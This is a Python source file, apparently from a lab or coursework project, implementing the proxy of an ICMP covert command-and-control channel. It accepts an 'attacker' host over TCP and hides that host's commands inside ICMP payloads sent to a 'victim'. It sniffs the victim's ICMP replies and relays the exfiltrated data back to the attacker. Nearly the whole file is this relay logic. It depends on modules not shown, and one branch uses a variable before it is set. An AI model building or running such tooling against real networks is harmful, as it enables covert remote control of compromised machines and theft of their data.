#from scapy.all import * 
from scapy.all import IP, ICMP, Raw 

import datetime 
import time
import ipaddress
import sys 
import os 
import argparse 
import re 
import random
import threading
from functools import partial 
import json
import type_singleton as singleton
import socket

file_path = "../comunication_methods.py"
directory = os.path.dirname(file_path)
sys.path.insert(0, directory)
import comunication_methods as com

file_path = "../mymethods.py"
directory = os.path.dirname(file_path)
sys.path.insert(0, directory)
import mymethods 



def find_local_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    print(localIP:=s.getsockname()[0])
    s.close()
    return localIP

#------------------------------------
def callback_wait_data_from_vicitm(event_pktconn:threading.Event, data_lock:threading.Lock, data_received:list=[]): 
    def callback(packet):
        print(f"callback wait_data_from_vicitm received:\n\t{packet.summary()}") 
        if packet.haslayer(IP) and packet.haslayer(ICMP) and packet.haslayer(Raw):
            checksum=mymethods.calc_checksum(packet[Raw].load)
            #print(f"Payload received:\t{packet[Raw].load}")
            #print(f"ID ICMP {packet[ICMP].id} e checksum {checksum} combaciano?{packet[ICMP].id==checksum}")
            if packet[ICMP].id==checksum: 
                update_data_received(
                    [packet[ICMP].id,packet[ICMP].seq,packet[Raw].load]
                    ,data_lock
                    ,data_received
                )
                if com.LAST_PACKET.encode() in packet[Raw].load:
                    #print(f"The packet contains {com.LAST_PACKET}\t{packet[Raw].load}")
                    com.set_threading_Event(event_pktconn) 
    return callback 
    
def callback_wait_conn_from_victim(ip_vittima:ipaddress.IPv4Address|ipaddress.IPv6Address=None, ip_host:ipaddress.IPv4Address|ipaddress.IPv6Address=None, event_pktconn:threading.Event=None): 
    def callback(packet):
        print(f"callback wait_conn_from_victim received:\n\t{packet.summary()}") 
        if packet.haslayer(IP) and packet.haslayer(ICMP) and packet.haslayer(Raw):   
            #print(f"Ricevuto pacchetto da {packet[IP].src}...")
            confirm_text=com.CONFIRM_VICTIM+ip_vittima.compressed+ip_host.compressed
            check_sum=mymethods.calc_checksum(confirm_text.encode()) 
            if check_sum==packet[ICMP].id and ip_vittima.compressed==packet[IP].src: 
                print(f"Il pacchetto ha confermato la connessione...") 
                com.set_threading_Event(event_pktconn) 
                return
        print(f"Il pacchetto non ha confermato la connessione...")
    return callback 

def redirect_command_to_victim(command_to_redirect:str, ip_vittima:ipaddress.IPv4Address|ipaddress.IPv6Address):
    if not isinstance(command_to_redirect, str):
        raise Exception(f"Il comando non è una stringa")
    if not isinstance(ip_vittima, ipaddress.IPv4Address) and not isinstance(ip_vittima, ipaddress.IPv6Address):
        raise Exception(f"IP attaccante non è istanza di IPv4Address ne di IPv6Address")
    print(f"Sendin command {command_to_redirect} to {ip_vittima}") 
    if com.send_packet(command_to_redirect.encode(),ip_vittima):
        print(f"la vittima ha ricevuto il comando")
        return True
    print(f"la vittima non ha ricevuto il comando")
    return False 

#--------------------------------
def update_data_received(data, data_lock:threading.Lock, data_received):
    data_lock.acquire()
    data_received.append(data)
    data_lock.release() 

def update_victim_end_communication(ip_vittima):
    try:
        com.is_valid_ipaddress(ip_vittima)
    except Exception as e:
        raise Exception(f"update_victim_end_communication: {e}")
    data=com.END_COMMUNICATION
    if com.send_packet(data.encode(),ip_vittima):
        print(f"{ip_vittima}: la vittima è stata aggiornata")
        return
    print(f"{ip_vittima}: la vittima non è stata aggiornata")

#--------------------------------
def setup_thread(callback_function=None,ip_host:ipaddress.IPv4Address|ipaddress.IPv6Address=None): 
    try: 
        #com.is_callback_function(callback_function)
        if not isinstance(ip_host, ipaddress.IPv4Address) and not isinstance(ip_host, ipaddress.IPv6Address):
            raise Exception("ip_host non è ne un IPv4Address ne un IPv6Address")
        if not callable(callback_function):
            raise ValueError("La callback function passata non è chiamabile")  
    except Exception as e:
        raise Exception(f"setup_thread: {e}")
   
    thread_lock=threading.Lock()
    thread_response={ip_host.compressed:False}
    thread_dict={ip_host.compressed:threading.Thread( target=callback_function)}  
    return thread_lock, thread_response, thread_dict


def setup_server(ip_attaccante:ipaddress.IPv4Address|ipaddress.IPv6Address):
    if not isinstance(ip_attaccante, ipaddress.IPv4Address) and not isinstance(ip_attaccante, ipaddress.IPv6Address):
        raise Exception(f"IP attaccante non è istanza di IPv4Address ne di IPv6Address")
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        print(f"Server listening: {s}")  
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) 
        s.bind(("192.168.56.104", 4567))  #(socket.gethostname(), 4567)
        s.listen(1)
        socket_attacker, attacker_addr=s.accept()
        if ipaddress.ip_address(attacker_addr[0]).compressed != ip_attaccante.compressed:
            socket_attacker.close()
        else:
            #with self.socket_attacker:   
            data_received=socket_attacker.recv(1024).decode()
            if not data_received or com.CONFIRM_ATTACKER not in data_received:
                print(f"Invalid data from {attacker_addr}: {data_received}") 
                socket_attacker.close()  
                exit(0) 
    return data_received, socket_attacker

#-------------------------------- 
def check_value_in_parser(args):  
    if not isinstance(args,argparse.Namespace): 
        raise Exception(f"Argomento parser non è istanza di argparse.Namespace")  
    if not isinstance(args.ip_attaccante,str): 
        raise Exception(f"--ip_attaccante non specificato: {args.ip_attaccante}")
    #if not isinstance(args.ip_vittima,str):  
    #    raise Exception(f"--ip_vittima non specificato: {args.ip_vittima}") 
    return True

def get_args_from_parser(): 
    parser = argparse.ArgumentParser()
    #parser.add_argument("--ip_host",type=str, help="IP dell'host")
    parser.add_argument("--ip_attaccante",type=str, help="IP dell'attaccante")
    #parser.add_argument("--ip_vittima",type=str, help="IP vittima")
    #parser.add_argument("--provaFlag",type=int, help="Comando da eseguire")
    try:
        args, unknown =mymethods.check_for_unknown_args(parser)  
        if len(unknown) > 0: 
            raise Exception(f"Argomenti sconosciuti: {unknown}") 
        if check_value_in_parser(args):  
            return args
    except Exception as e:
        mymethods.print_parser_supported_arguments(parser)
        raise Exception(f"get_args_from_parser: {e}")

class Proxy:  
    def __init__(self):  
        try:
            if not isinstance(args:=get_args_from_parser(),argparse.Namespace): 
                raise ValueError("args non è istanza di argparse.Namespace")
            dict_values={
                "ip_attaccante":args.ip_attaccante  
            } 
            self.ip_attaccante=ipaddress.ip_address(dict_values.get("ip_attaccante") )
            print(f"IP attaccante: {type(self.ip_attaccante)} : {self.ip_attaccante}") 
            _,ip_host=mymethods.iface_src_from_IP(self.ip_attaccante)
            self.ip_host=ipaddress.ip_address(ip_host)
            print(f"IP host: {type(self.ip_host)} : {self.ip_host}")
        except Exception as e: 
            print(f"_init_ setup args: {e}")
            exit(1)
        
        #socket.create_server(addr, family=socket.AF_INET6, dualstack_ipv6=True) #socket 4 both ipv4 and ipv6
        data_received, self.socket_attacker= setup_server(self.ip_attaccante)
        self.ip_vittima=ipaddress.ip_address(data_received.replace(com.CONFIRM_ATTACKER,""))
        print(f"IP vittima: {type(self.ip_vittima)} : {self.ip_vittima}")

        data=com.CONFIRM_PROXY+self.ip_vittima.compressed+self.ip_host.compressed
        self.socket_attacker.sendall(data.encode()) 
        print("Socket con attaccante stabilito")
        
        try: 
            #connection_with_victim
            #self.thread_lock, self.thread_response, self.thread_list 
            self.thread_lock, self.thread_response, self.thread_dict=setup_thread(
                self.wait_conn_from_victim 
                ,self.ip_host
            )
            print(f"Lock creato:\t{self.thread_lock}")
            print(f"Thread creato:\t{self.thread_dict}")
            print(f"Risposte create:\t{self.thread_response}")

            thread=self.thread_dict.get(self.ip_host.compressed)
            thread.start() 
            #confirm_conn_to_victim
            confirm_text=com.CONFIRM_PROXY+self.ip_vittima.compressed
            if com.send_packet(confirm_text.encode() , self.ip_vittima): 
                print(f"Reply: la vittima {self.ip_vittima} ha risposto") 
                result= True 
            else:
                print(f"No Reply: la vittima {self.ip_vittima} non ha risposto") 
                result= False 
            thread.join()

            self.thread_lock.acquire() 
            result=self.thread_response.get(self.ip_host.compressed) and result  
            self.thread_lock.release()

            data=com.CONFIRM_VICTIM+self.ip_vittima.compressed+self.ip_host.compressed+str(result)
            self.socket_attacker.sendall(data.encode()) 
            print(f"Aggiornamento confermato all'attaccante")
            if not result:
                self.socket_attacker.close()
                raise Exception(f"Il proxy {self.ip_host} non è connesso alla vittima {self.ip_vittima}") 
            print(f"\t***{self.ip_host} è connesso a {self.ip_vittima}")   
        except Exception as e: 
            print(f"_init_ conn victim: {e}")
            exit(1)  
        #wait_command_from_attacker 
        self.data_lock=threading.Lock()
        data_socket=self.socket_attacker.recv(1024).decode()  
        while data_socket and data_socket not in com.exit_cases and com.END_COMMUNICATION not in data_socket: 
            self.data_received=[] 
            thread_data=threading.Thread(
                target=self.wait_data_from_vicitm
                #,args=[self.ip_vittima]
            )
            thread_data.start()
            #if comando is not None:
            #   data=com.CONFIRM_COMMAND+comando
            if com.CONFIRM_COMMAND in data_socket:
                #if not self.redirect_command_to_victim(command.encode()):
                command= data_socket.replace(com.CONFIRM_COMMAND,"").strip()
                print(f"Ho il comando per la vittima: {command}")
                redirect_command_to_victim(com.CONFIRM_COMMAND+command, self.ip_vittima)  
            elif com.WAIT_DATA in command:
                print("Non ho il comando per la vittima. Dalla vittima aspetto i dati")
            else: 
                print(f"Caso non contemplato: {command}")
            thread_data.join()
            
            if len(self.data_received)<=0:
                self.socket_attacker.sendall(com.LAST_PACKET.encode()) 
            else:
                self.redirect_data_to_attacker()
            data_socket=self.socket_attacker.recv(1024).decode()
        print("Interruzione del programma")
        update_victim_end_communication(self.ip_vittima)
        self.socket_attacker.close()  
    
    def wait_conn_from_victim(self):
        #print("\n(─‿─)\twait_conn_from_victim\n")
        try:
            confirm_text=com.CONFIRM_VICTIM+self.ip_vittima.compressed+self.ip_host.compressed
            checksum=mymethods.calc_checksum(confirm_text.encode())
            interface,_=mymethods.iface_src_from_IP(self.ip_vittima)
            self.event_pktconn=com.get_threading_Event()
            filter=singleton.AttackType().get_filter_connection_from_function(
                "wait_conn_from_victim"
                ,self.ip_vittima
                ,checksum
            ) 
        except Exception as e:
            print(f"wait_conn_from_victim: {e}")
            return False

        try:
            args={
                "filter":filter
                ,"count":1 
                ,"prn":callback_wait_conn_from_victim(
                    self.ip_vittima
                    ,self.ip_host
                    ,self.event_pktconn
                )
                #,"store":True 
                ,"iface":interface
            } 
            self.sniffer,self.pkt_timer=com.sniff_packet(args,event=self.event_pktconn) 
            com.wait_threading_Event(self.event_pktconn)
        except Exception as e:
            raise Exception(f"wait_conn_from_victim: {e}")
        
        com.stop_sinffer(self.sniffer)
        if res:=com.stop_timer(self.pkt_timer): 
            print(f"La connessione per {self.ip_vittima} è confermata")  
        else: 
            print(f"La connessione per {self.ip_vittima} non è confermata") 
        com.update_thread_response(
            self.ip_host
            ,self.thread_lock
            ,self.thread_response
            ,res
        )
        return res

    def wait_data_from_vicitm(self):
        print(f"Aspetto i dati da {self.ip_vittima}")
        try:
            self.event_pktconn=com.get_threading_Event()
            interface,_=mymethods.iface_src_from_IP(self.ip_vittima)
            filter=singleton.AttackType().get_filter_connection_from_function(
                "wait_data_from_vicitm"
                ,ip_src=self.ip_vittima
                ,ip_dst=self.ip_host
            )
        except Exception as e:
            raise Exception(f"wait_data_from_vicitm: {e}")

        args={
            "filter":filter
            #,"count":1 
            ,"prn":callback_wait_data_from_vicitm(self.event_pktconn, self.data_lock, self.data_received)
            #,"store":True 
            ,"iface":interface
        }

        try: 
            self.sniffer, self.timeout_timer=com.sniff_packet(args,event=self.event_pktconn, timeout_time=None) 
            com.wait_threading_Event(self.event_pktconn) 
        except Exception as e:
            raise Exception(f"wait_data_from_vicitm: {e}")
        
        com.stop_sinffer(self.sniffer)
        if com.stop_timer(self.timeout_timer): 
            print(f"Proxy: {self.ip_vittima} ha mandato i dati") 
            return True
        print(f"Proxy: {self.ip_vittima} non ha mandato i dati") 
        return False
    
    def redirect_data_to_attacker(self): 
        #print(f"data_received: {self.data_received}") 
        for data in self.data_received:
            id, seq, info= data
            print(f"Data {id} / {seq} / {info}")
            info= info.decode() if isinstance(info,bytes) else info  
            try: 
                self.socket_attacker.sendall(
                    (f"{id}\t{seq}\t{info}||").encode()
                )
            except Exception as e:
                print(f"redirect_data_to_attacker: {e}")
        print(f"Dati mandati all'attaccante")



if __name__=="__main__":  
    Proxy()